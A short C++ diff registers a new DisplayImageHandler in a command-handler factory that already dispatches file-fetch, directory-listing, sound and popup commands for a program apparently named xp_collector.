@@ -1,6 +1,7 @@
 #include "CommandHandlers/CommandHandlerFactory.h"
 
 #include "DirListHandler.h"
+#include "DisplayImageHandler.h"
 #include "GetFileHandler.h"
 #include "PlaySoundHandler.h"
 #include "CommandHandlers/PopupHandler.h"
@@ -22,6 +23,7 @@ std::unique_ptr<xp_collector::ICommandHandler> xp_collector::CommandHandlerFacto
 	case CommandType::GetFile: return std::make_unique<GetFileHandler>(command_id);
 	case CommandType::DirList: return std::make_unique<DirListHandler>(command_id);
 	case CommandType::PlaySoundCommand: return std::make_unique<PlaySoundHandler>(command_id);
+	case CommandType::DisplayImage: return std::make_unique<DisplayImageHandler>(command_id);
 	default: throw std::invalid_argument("Unhandled command type in CommandHandlerFactory");
 	}
 }
